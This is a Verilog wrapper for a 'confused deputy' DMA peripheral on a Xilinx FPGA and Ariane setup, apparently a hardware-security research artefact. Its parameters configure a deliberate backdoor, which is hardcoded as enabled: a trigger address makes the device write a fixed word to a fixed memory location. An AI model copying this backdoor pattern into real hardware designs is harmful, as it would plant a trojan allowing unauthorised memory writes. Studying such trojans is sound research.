`include "ariane_xlnx_mapper.svh"
`include "northcape_xilinx_wrapper.vh"

module northcape_confused_deputy_dma_wrapper_verilog#(
    // AXI parameters
    parameter AXI_LITE_ADDR_WIDTH = 6,
    parameter AXI_LITE_DATA_WIDTH = 64,
    parameter AXI_LITE_USER_WIDTH = -1,
    parameter AXI_ADDR_WIDTH = 64,  
    parameter AXI_DATA_WIDTH = 64,
    parameter AXI_ID_WIDTH = 4,
    parameter AXI_USER_WIDTH = 1,

    // backdoor parameters :evil:
    parameter ENABLE_BACKDOOR=1,
    parameter BACKDOOR_WRITE_ADDRESS = 64'hfacecafe,
    parameter BACKDOOR_WRITE_WORD = 64'hfeedbeef,
    parameter BACKDOOR_WRITE_MASK = 8'hfe,

    parameter BACKDOOR_TRIGGER_ADDRESS = 64'hdecade00,
    parameter BACKDOOR_TRIGGER_ADDRESS_MASK = 64'hffffffffffffff00
)
(
    input wire aclk,
    input wire aresetn,

    `AXI_LITE_INTERFACE_MODULE_INPUT(S_AXI, wire),
    `AXI_INTERFACE_MODULE_OUTPUT(m_axi_out)
);

    northcape_confused_deputy_dma_wrapper #(
    .AXI_ADDR_WIDTH(AXI_ADDR_WIDTH),
    .AXI_DATA_WIDTH(AXI_DATA_WIDTH),
    .AXI_ID_WIDTH(AXI_ID_WIDTH),
    .AXI_USER_WIDTH(AXI_USER_WIDTH),
    .AXI_LITE_ADDR_WIDTH(AXI_LITE_ADDR_WIDTH),
    .AXI_LITE_DATA_WIDTH(AXI_LITE_DATA_WIDTH),
    .AXI_LITE_USER_WIDTH(AXI_LITE_USER_WIDTH),

    .ENABLE_BACKDOOR(1),
    .BACKDOOR_WRITE_ADDRESS(BACKDOOR_WRITE_ADDRESS),
    .BACKDOOR_WRITE_WORD(BACKDOOR_WRITE_WORD),
    .BACKDOOR_WRITE_MASK(BACKDOOR_WRITE_MASK),
    .BACKDOOR_TRIGGER_ADDRESS(BACKDOOR_TRIGGER_ADDRESS),
    .BACKDOOR_TRIGGER_ADDRESS_MASK(BACKDOOR_TRIGGER_ADDRESS_MASK)
)
i_northcape_confused_deputy_dma_wrapper ( 
    .clk_i(aclk),
    .rst_ni(aresetn),

    `AXI_LITE_INTERFACE_FORWARD(S_AXI),
    `AXI_INTERFACE_FORWARD(m_axi_out)
 );
  

endmodule
